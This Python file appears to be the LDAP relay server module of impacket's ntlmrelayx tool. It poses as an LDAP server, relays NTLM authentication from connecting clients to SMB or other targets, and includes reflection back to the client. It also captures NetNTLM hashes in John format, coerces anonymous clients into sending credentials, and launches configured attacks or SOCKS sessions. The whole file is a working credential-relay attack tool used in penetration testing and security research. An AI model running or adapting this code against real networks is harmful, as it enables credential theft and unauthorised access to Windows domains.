import socketserver
from threading import Thread
import struct
import re

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections


class LDAPRelayServer(Thread):

    class LDAPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_thread = True
            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class LDAPHandler(socketserver.BaseRequestHandler):
        def __init__(self, request, client_address, server):
            self.server = server
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None

            if self.server.config.target is None:
                # Reflection mode, defaults to SMB at the target, for now
                self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
            self.target = self.server.config.target.getTarget()
            if self.target is None:
                LOG.info("LDAP: Received connection from %s, but there are no more targets left!" % client_address[0])
                return

            LOG.info("LDAP: Received connection from %s, attacking target %s://%s" % (client_address[0], self.target.scheme, self.target.netloc))

            super().__init__(request, client_address, server)


        def ParseLDAPPacket(self, data, client):
            if data[1:2] == b'\x84':
                MessageSequenceOffset = struct.unpack('<b',data[7:8])[0] - 1
                message_sequence  = data[8:9+MessageSequenceOffset]
                Operation        = data[9+MessageSequenceOffset:10+MessageSequenceOffset]

                if Operation == b'\x63': # Search
                    if re.search(b'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
                        message1 = b'\x02' + data[7:8] + message_sequence +                      \
                                b'\x64\x84\x00\x00\x00\x57\x04\x00\x30\x84\x00\x00\x00\x4f' +    \
                                b'\x30\x84\x00\x00\x00\x49\x04\x17supportedSASLMechanisms' +     \
                                b'\x31\x84\x00\x00\x00\x2a\x04\x06GSSAPI\x04\x0aGSS-SPNEGO' +    \
                                b'\x04\x08EXTERNAL\x04\x0aDIGEST-MD5'
                        message1_len = struct.pack('>i', len(message1))
                        buffer1 = b'\x30\x84' + message1_len + message1
                        message2 = b'\x02' + data[7:8] + message_sequence +                      \
                                b'\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00'
                        message2_len = struct.pack('>i', len(message2))
                        buffer2 = b'\x30\x84' + message2_len + message2
                        buffer = buffer1 + buffer2
                    elif re.search(b'(?i)(objectClass0*.*supportedCapabilities)', data):
                        message1 = b'\x02' + data[7:8] + message_sequence +                      \
                                b'\x64\x84\x00\x00\x00\x75\x04\x00\x30\x84\x00\x00\x00\x6d' +    \
                                b'\x30\x84\x00\x00\x00\x67\x04\x15supportedCapabilities' +       \
                                b'\x31\x84\x00\x00\x00\x4a\x04\x161.2.840.113556.1.4.800' +      \
                                b'\x04\x171.2.840.113556.1.4.1670\x04\x171.2.840.113556.1.4.1791'
                        message1_len = struct.pack('>i', len(message1))
                        buffer1 = b'\x30\x84' + message1_len + message1
                        message2 = b'\x02' + data[7:8] + message_sequence +                      \
                                b'\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00'
                        message2_len = struct.pack('>i', len(message2))
                        buffer2 = b'\x30\x84' + message2_len + message2
                        buffer = buffer1 + buffer2
                    elif re.search(b'(objectClass)', data):
                        message = b'\x02' + data[7:8] + message_sequence +                       \
                                b'\x65\x07\x0A\x01\x00\x04\x00\x04\x00'
                        message_len = struct.pack('>i', len(message))
                        buffer = b'\x30\x84' + message_len + message

                    return buffer
                
                elif Operation == b'\x60': # Bind
                    sasl = data[20+MessageSequenceOffset:21+MessageSequenceOffset]
                    if sasl == b'\xA3':
                        if not self.challengeMessage:
                            ntlmssp = re.search(b'NTLMSSP', data)
                            if not self.do_ntlm_negotiate(data[ntlmssp.start():]):
                                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target', self.target.scheme, self.target.netloc)
                                self.server.config.target.registerTarget(self.target)
                            else:
                                ntlm_chal_token = self.challengeMessage.getData()
                                if len(ntlm_chal_token) <= 127:
                                    ntlm_chal_len = struct.pack('B', len(ntlm_chal_token))
                                    bind_response = b'\x0a\x01\x0e\x04\x00\x04\x00\x87\x81' + ntlm_chal_len + ntlm_chal_token
                                else:
                                    ntlm_chal_len = struct.pack('>h', len(ntlm_chal_token))
                                    bind_response = b'\x0a\x01\x0e\x04\x00\x04\x00\x87\x82' + ntlm_chal_len + ntlm_chal_token
                                bind_response_len = struct.pack('>i', len(bind_response))
                                message = b'\x02' + data[7:8] + message_sequence + b'\x61\x84' + bind_response_len + bind_response
                                message_len = struct.pack('>i', len(message))
                                buffer = b'\x30\x84' + message_len + message
                                return buffer
                        else: 
                            ntlmssp = re.search(b'NTLMSSP', data)
                            ntlm_auth = data[ntlmssp.start():]
                            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                            authenticateMessage.fromString(ntlm_auth)
                            if not self.do_ntlm_auth(ntlm_auth, authenticateMessage):
                                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                                        self.target.scheme, self.target.netloc,
                                        authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le')))
                                else:
                                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                                        self.target.scheme, self.target.netloc,
                                        authenticateMessage['domain_name'].decode('ascii'),
                                        authenticateMessage['user_name'].decode('ascii')))
                            else:
                                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le')))
                                else:
                                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                                        authenticateMessage['user_name'].decode('ascii')))
            
                                ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                                    authenticateMessage['user_name'],
                                                                    authenticateMessage['domain_name'],
                                                                    authenticateMessage['lanman'], authenticateMessage['ntlm'])
                                self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
            
                                if self.server.config.outputFile is not None:
                                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                                          self.server.config.outputFile)
            
                                self.server.config.target.registerTarget(self.target, True, self.authUser)
            
                                self.do_attack()
                

        def handle(self):
            try:
                data = self.request.recv(8092)
                for x in range(5):
                    buffer = self.ParseLDAPPacket(data, self.client_address[0])
                    if buffer:
                        self.request.send(buffer)
                    data = self.request.recv(8092)
            except Exception as e:
                LOG.error(e)

        def do_ntlm_negotiate(self, token):
            if self.target.scheme.upper() in self.server.config.protocolClients:
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                # If connection failed, return
                if not self.client.initConnection():
                    return False
                self.challengeMessage = self.client.sendNegotiate(token)

                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                if self.server.config.remove_target:
                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())

                # Check for errors
                if self.challengeMessage is False:
                    return False
            else:
                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
                return False

            return True


        def do_ntlm_auth(self, token, authenticateMessage):
            # For some attacks it is important to know the authenticated username, so we store it
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'))).upper()
            else:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'))).upper()

            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                clientResponse, errorCode = self.client.sendAuth(token)
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                # when coming from localhost
                errorCode = STATUS_ACCESS_DENIED

            if errorCode == STATUS_SUCCESS:
                return True

            return False


        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(), self.authUser, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session, self.authUser)
                clientThread.start()
            else:
                LOG.error('LDAP: No attack configured for %s' % self.target.scheme.upper())
            

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.server = None
        self.config = config

    def run(self):
        if self.config.listeningPort:
            ldapport = self.config.listeningPort
        else:
            ldapport = 389

        LOG.info("Setting up LDAP Server on port %s" % self.config.listeningPort)

        self.server = self.LDAPServer((self.config.interfaceIp, ldapport), self.LDAPHandler, self.config)
        try:
            self.server.serve_forever()
        except Exception as e:
            print(e)

        LOG.info('Shutting down LDAP Server')
        self.server.server_close()
